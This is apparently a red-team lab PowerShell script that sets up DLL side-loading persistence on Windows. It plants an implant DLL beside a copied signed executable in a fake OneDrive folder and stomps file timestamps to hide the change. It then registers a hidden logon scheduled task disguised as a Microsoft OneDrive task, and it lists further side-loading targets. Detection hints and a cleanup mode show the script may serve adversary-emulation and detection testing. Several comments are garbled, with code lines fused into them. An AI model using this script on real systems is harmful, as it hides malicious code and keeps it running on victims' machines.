# persist_08_dllsideload.ps1 -- DLL Side-Loading Persistence
# MITRE ATT&CK: T1574.002
# : Admin
# Detection: Sysmon EventID 7 (Image Loaded) -- unsigned DLL loaded by signed exe
#
# :
# 1. signed exe DLL signature
# 2. copy signed exe + DLL # 3. exe -> DLL -> implant # AV signed exe start -> 
param(
    [Parameter(Mandatory=$true)]
 [string]$ImplantDllPath, # Path DLL implant

 [string]$TargetExe = "C:\Windows\System32\OneDriveSetup.exe", # signed exe DLL
 [string]$TargetDll = "version.dll", # DLL exe (version.dll common target)
    [string]$InstallDir = "$env:LOCALAPPDATA\Microsoft\OneDrive",
    [switch]$Cleanup
)

$ErrorActionPreference = "Stop"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] This script requires Administrator privileges!" -ForegroundColor Red
    exit 1
}

function Install-DllSideload {
    Write-Host "[*] DLL Side-Loading Persistence" -ForegroundColor Cyan
    Write-Host "    MITRE: T1574.002"

 # 1. directory
    if (-not (Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
        Write-Host "    [+] Created: $InstallDir"
    }

 # 2. Copy signed exe directory     $exeDest = Join-Path $InstallDir (Split-Path $TargetExe -Leaf)
    Copy-Item $TargetExe $exeDest -Force
    Write-Host "    [+] Copied signed exe: $exeDest"

 # 3. DLL exe     $dllDest = Join-Path $InstallDir $TargetDll
    Copy-Item $ImplantDllPath $dllDest -Force
    Write-Host "    [+] Placed DLL: $dllDest"

 # 4. timestamp (timestamp stomp)
    $oldDate = (Get-Date).AddDays(-180)
    (Get-Item $exeDest).CreationTime = $oldDate
    (Get-Item $exeDest).LastWriteTime = $oldDate
    (Get-Item $dllDest).CreationTime = $oldDate
    (Get-Item $dllDest).LastWriteTime = $oldDate
    Write-Host "    [+] Timestamps adjusted to $($oldDate.ToString('yyyy-MM-dd'))"

 # 5. Scheduled Task exe login (trigger DLL load)
    $taskName = "Microsoft\Windows\OneDrive\OneDriveSync"
    $action = New-ScheduledTaskAction -Execute $exeDest
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    Write-Host "    [+] Scheduled Task created: $taskName"

    Write-Host ""
    Write-Host "    [!] How it works:" -ForegroundColor Yellow
    Write-Host "        User login -> Task runs signed exe -> exe loads $TargetDll (ours) -> implant"
    Write-Host "        AV sees: signed exe loaded a DLL = looks normal"

    # Wazuh detection
    Write-Host ""
    Write-Host "    [DETECTION] Sysmon EventID 7: unsigned DLL loaded by signed process" -ForegroundColor Red
    Write-Host "    [DETECTION] Check: DLL not in original directory of the signed exe" -ForegroundColor Red
}

function Remove-DllSideload {
    Write-Host "[*] Cleaning up DLL Side-Loading..." -ForegroundColor Yellow

 # Scheduled Task
    $taskName = "Microsoft\Windows\OneDrive\OneDriveSync"
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    Write-Host "    [+] Task removed"

 # files
    if (Test-Path $InstallDir) {
        Remove-Item $InstallDir -Recurse -Force
        Write-Host "    [+] Directory removed: $InstallDir"
    }

    Write-Host "    [+] Cleanup complete"
}

# --- DLL Side-Loading candidates ---
function Find-SideloadTargets {
    Write-Host "[*] Scanning for DLL side-loading targets..." -ForegroundColor Cyan
    Write-Host "    Looking for signed exes that load missing DLLs..."
    Write-Host ""

    # Common known targets
    $knownTargets = @(
        @{Exe="OneDriveSetup.exe"; Dll="version.dll"; Path="C:\Windows\System32"},
        @{Exe="notepad.exe"; Dll="wshom.ocx"; Path="C:\Windows\System32"},
        @{Exe="mmc.exe"; Dll="ntshrui.dll"; Path="C:\Windows\System32"}
    )

    foreach ($t in $knownTargets) {
        $exePath = Join-Path $t.Path $t.Exe
        if (Test-Path $exePath) {
            $sig = Get-AuthenticodeSignature $exePath -ErrorAction SilentlyContinue
            $signed = if ($sig.Status -eq "Valid") { "SIGNED" } else { "unsigned" }
            Write-Host "    [+] $($t.Exe) ($signed) -> loads $($t.Dll)"
        }
    }

    Write-Host ""
    Write-Host "    [TIP] Use Procmon to find more:" -ForegroundColor Yellow
    Write-Host "    Filter: Operation=CreateFile, Path ends with .dll, Result=NAME NOT FOUND"
}

# --- Main ---
if ($Cleanup) {
    Remove-DllSideload
} elseif ($ImplantDllPath) {
    Install-DllSideload
} else {
    Find-SideloadTargets
}
